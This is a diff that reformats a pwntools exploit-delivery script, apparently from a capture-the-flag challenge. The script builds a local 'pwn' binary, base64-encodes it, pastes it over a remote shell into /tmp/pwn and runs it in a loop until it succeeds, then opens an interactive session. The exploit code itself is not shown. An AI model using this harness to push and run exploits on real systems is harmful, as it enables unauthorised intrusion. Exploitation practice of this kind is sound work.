@@ -6,11 +6,17 @@ lwarn = lambda x: log.warn(x)
 lerror = lambda x: log.error(x)
 lprog = lambda x: log.progress(x)
 
-byt = lambda x: x if isinstance(x, bytes) else x.encode() if isinstance(x, str) else repr(x).encode()
-phex = lambda x, y='': print(y + hex(x))
-lhex = lambda x, y='': linfo(y + hex(x))
-pad = lambda x, s=8, v=b'\0', o='r': byt(x).ljust(s, byt(v)) if o == 'r' else byt(x).rjust(s, byt(v))
-padhex = lambda x, s=None: pad(hex(x)[2:],((x.bit_length()//8)+1)*2 if s is None else s, b'0', 'l')
+byt = (
+  lambda x: x if isinstance(x, bytes) else x.encode() if isinstance(x, str) else repr(x).encode()
+)
+phex = lambda x, y="": print(y + hex(x))
+lhex = lambda x, y="": linfo(y + hex(x))
+pad = (
+  lambda x, s=8, v=b"\0", o="r": byt(x).ljust(s, byt(v)) if o == "r" else byt(x).rjust(s, byt(v))
+)
+padhex = lambda x, s=None: pad(
+  hex(x)[2:], ((x.bit_length() // 8) + 1) * 2 if s is None else s, b"0", "l"
+)
 upad = lambda x: u64(pad(x))
 tob = lambda x: bytes.fromhex(padhex(x).decode())
 
@@ -39,60 +45,63 @@ it = lambda t=None: gt(t).interactive()
 cl = lambda t=None: gt(t).close()
 
 
-IP = 'localhost'
+IP = "localhost"
 PORT = 28338
-BINARY='./out/pwn'
-PREFIX='~ $'
+BINARY = "./out/pwn"
+PREFIX = "~ $"
+
 
 def send_cmd(cmd, prefix=PREFIX):
   ru(prefix)
   sl(cmd)
   ru(cmd)
 
+
 def checkpoint():
-  key=randoms(0x10)
-  send_cmd(f'echo {key}'.encode())
+  key = randoms(0x10)
+  send_cmd(f"echo {key}".encode())
   ru(key.encode())
 
-context.newline = b'\r\n'
 
-linfo('compile pwn binary')
-if os.system('make'):
-  lerror('failed to compile')
-os.system(f'xz {BINARY}')
+context.newline = b"\r\n"
 
-linfo('read pwn file')
-pwn = b''
-with open(f'{BINARY}.xz', 'rb') as pwn_file:
+linfo("compile pwn binary")
+if os.system("make"):
+  lerror("failed to compile")
+os.system(f"xz --keep {BINARY}")
+
+linfo("read pwn file")
+pwn = b""
+with open(f"{BINARY}.xz", "rb") as pwn_file:
   pwn = b64e(pwn_file.read())
 
-os.remove(f'{BINARY}.xz')
+os.remove(f"{BINARY}.xz")
 
 t = remote(IP, PORT)
 
-linfo('wait for init')
-ru(b'#    Tired of bloated heap implementations?        #')
+linfo("wait for init")
+ru(b"#    Tired of bloated heap implementations?        #")
 checkpoint()
 
-linfo('deploy pwn binary')
-send_cmd(b'base64 -d << EOF | unxz > /tmp/pwn')
+linfo("deploy pwn binary")
+send_cmd(b"base64 -d << EOF | unxz > /tmp/pwn")
 
-p = log.progress('sending file')
-STEPS=64
+p = log.progress("sending file")
+STEPS = 64
 for i in range(0, len(pwn), STEPS):
-  p.status(f'sending file {i//STEPS}/{len(pwn)//STEPS}')
-  line = pwn[i:min(i+STEPS, len(pwn))]
-  send_cmd(line.encode(), '> ')
+  p.status(f"sending file {i//STEPS}/{len(pwn)//STEPS}")
+  line = pwn[i : min(i + STEPS, len(pwn))]
+  send_cmd(line.encode(), "> ")
 
-sl(b'EOF')
-p.success('send file')
+sl(b"EOF")
+p.success("send file")
 
-sl(b'chmod +x /tmp/pwn')
+sl(b"chmod +x /tmp/pwn")
 
 checkpoint()
 
-linfo('execute pwn binary')
-sl(b'while ! /tmp/pwn; do test; done')
+linfo("execute pwn binary")
+sl(b"while ! /tmp/pwn; do test; done")
 rl()
 
 t.interactive()
